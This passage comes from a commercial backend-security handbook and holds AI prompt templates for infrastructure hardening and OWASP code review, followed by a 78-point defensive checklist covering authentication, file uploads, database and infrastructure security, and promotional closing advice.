Output: Complete TypeScript files with Prisma schema and SQL.
```

### Prompt 4: Infrastructure Hardening (Module 4)

```
You are a senior DevOps/security engineer. Write a complete infrastructure
hardening layer for Node.js/Express that implements:
1. Redis-based sliding window rate limiting (Upstash)
2. Security headers (CSP, HSTS, X-Frame-Options, CORS)
3. Global exception handler (no stack traces to client)
4. Request size limits (1MB JSON)
5. Server information disclosure prevention
6. Graceful shutdown handling
Output: Complete TypeScript files with types.
```

### Prompt 5: Security Code Review (Module 5)

```
You are an elite application security engineer. Review the following code
for OWASP Top 10 vulnerabilities. For each:
1. IDENTIFY the vulnerability with OWASP category
2. EXPLAIN the attack vector
3. SHOW the vulnerable code
4. PROVIDE the exact fix
5. RATE severity (Critical/High/Medium/Low)
6. ESTIMATE fix effort (hours)
Check: A01 (Access Control), A02 (Crypto), A03 (Injection),
A04 (Insecure Design), A05 (Misconfiguration), A06 (Vulnerable Components),
A07 (Auth Failures), A08 (Data Integrity), A09 (Logging), A10 (SSRF).
Output: Detailed findings with code fixes and deployment recommendation.
```

---

## 5.7 The Master Security Checklist (All 5 Modules Combined)

> **The complete 78-point security checklist for any web application.**

### Module 1: Authentication & Access Control (15 Points)

| # | Check | Status |
|---|---|---|
| 1 | Access tokens in HTTP-Only cookies only | ⬜ |
| 2 | Refresh tokens in separate HTTP-Only cookie | ⬜ |
| 3 | Tokens never in localStorage/sessionStorage | ⬜ |
| 4 | RS256 asymmetric signing | ⬜ |
| 5 | Access token expiry ≤ 15 minutes | ⬜ |
| 6 | Refresh token rotation implemented | ⬜ |
| 7 | Token theft detection (reuse detection) | ⬜ |
| 8 | Token family revocation on theft | ⬜ |
| 9 | Account lockout after failed attempts | ⬜ |
| 10 | Generic auth error messages | ⬜ |
| 11 | No stack traces in auth errors | ⬜ |
| 12 | Device fingerprint validation | ⬜ |
| 13 | TypeScript strict typing | ⬜ |
| 14 | Secure cookie flags (HttpOnly, Secure, SameSite) | ⬜ |
| 15 | Logout invalidates all tokens | ⬜ |

### Module 2: Secure File Uploads (15 Points)

| # | Check | Status |
|---|---|---|
| 16 | File type validated against magic bytes | ⬜ |
| 17 | Magic bytes cross-validated with Content-Type | ⬜ |
| 18 | File size limits enforced per type | ⬜ |
| 19 | Filename sanitized (UUID, no user input) | ⬜ |
| 20 | All images re-encoded through Sharp | ⬜ |
| 21 | Original file never served | ⬜ |
| 22 | Presigned S3 URLs | ⬜ |
| 23 | S3 bucket: public access blocked | ⬜ |
| 24 | S3 bucket: server-side encryption | ⬜ |
| 25 | Files served through CDN | ⬜ |
| 26 | Upload rate limiting per user | ⬜ |
| 27 | SVG files blocked | ⬜ |
| 28 | No null bytes in filenames | ⬜ |
| 29 | TypeScript strict typing | ⬜ |
| 30 | Error messages don't leak paths | ⬜ |

### Module 3: Database Security (15 Points)

| # | Check | Status |
|---|---|---|
| 31 | All inputs validated with Zod | ⬜ |
| 32 | Zod strict mode enabled | ⬜ |
| 33 | No raw SQL with string interpolation | ⬜ |
| 34 | Prisma parameterized queries only | ⬜ |
| 35 | RLS enabled on all tables | ⬜ |
| 36 | RLS policies enforce user_id = auth.uid() | ⬜ |
| 37 | Password hashes never returned | ⬜ |
| 38 | Field-level select on all queries | ⬜ |
| 39 | Mass assignment prevented | ⬜ |
| 40 | Audit logging on mutations | ⬜ |
| 41 | Database transactions for multi-step ops | ⬜ |
| 42 | Sensitive field encryption (PII) | ⬜ |
| 43 | TypeScript strict typing | ⬜ |
| 44 | Error messages don't leak DB structure | ⬜ |
| 45 | Admin access uses separate policy | ⬜ |

### Module 4: Infrastructure Security (18 Points)

| # | Check | Status |
|---|---|---|
| 46 | Redis rate limiting implemented | ⬜ |
| 47 | Global rate limit (1000 req/min) | ⬜ |
| 48 | Auth rate limit (10 req/min) | ⬜ |
| 49 | User API rate limit (100 req/min) | ⬜ |
| 50 | 429 responses include Retry-After | ⬜ |
| 51 | Content-Security-Policy header | ⬜ |
| 52 | Strict-Transport-Security header | ⬜ |
| 53 | X-Content-Type-Options: nosniff | ⬜ |
| 54 | X-Frame-Options: DENY | ⬜ |
| 55 | CORS whitelist configured | ⬜ |
| 56 | X-Powered-By removed | ⬜ |
| 57 | Global exception handler | ⬜ |
| 58 | Stack traces never returned | ⬜ |
| 59 | Correlation IDs for errors | ⬜ |
| 60 | JSON body size limit (1MB) | ⬜ |
| 61 | 404 handler for undefined routes | ⬜ |
| 62 | Graceful shutdown handling | ⬜ |
| 63 | Process error handlers | ⬜ |

### Module 5: Operational Security (15 Points)

| # | Check | Status |
|---|---|---|
| 64 | Pre-deployment security review | ⬜ |
| 65 | OWASP Top 10 checklist completed | ⬜ |
| 66 | Dependency vulnerability scan | ⬜ |
| 67 | Security headers verified | ⬜ |
| 68 | Error logging in production | ⬜ |
| 69 | Audit trail for sensitive operations | ⬜ |
| 70 | Incident response plan documented | ⬜ |
| 71 | Backup and recovery tested | ⬜ |
| 72 | SSL/TLS certificate valid | ⬜ |
| 73 | Database backups automated | ⬜ |
| 74 | Environment variables secured | ⬜ |
| 75 | API keys rotated regularly | ⬜ |
| 76 | Security training for team | ⬜ |
| 77 | Penetration test scheduled | ⬜ |
| 78 | Security documentation complete | ⬜ |

---

## Final Notes

> **This handbook is your competitive advantage.** While other developers are guessing at security, you have a systematic, repeatable, profitable approach to securing applications.

### The Three Rules of Backend Security

1. **Never trust the client.** Every input is an attack vector until proven safe.
2. **Defense in depth.** One layer is not enough. Stack protections.
3. **Security is revenue.** Every vulnerability you find and fix is a client retained.

### Your Next Steps

1. **Internalize the 78-point checklist.** Run it on every project.
2. **Use the master prompts.** Let AI write secure code, then verify it.
3. **Deliver the audit report.** Turn findings into billable work.
4. **Sell the retainer.** One audit leads to quarterly revenue.
5. **Repeat.** Security is not a one-time task. It's a practice.

---

*THE SECURE BACKEND MASTER-VAULT — Version 1.0*
*Built for developers who ship secure, production-grade applications.*
*Every prompt. Every checklist. Every code snippet. Battle-tested.*

---

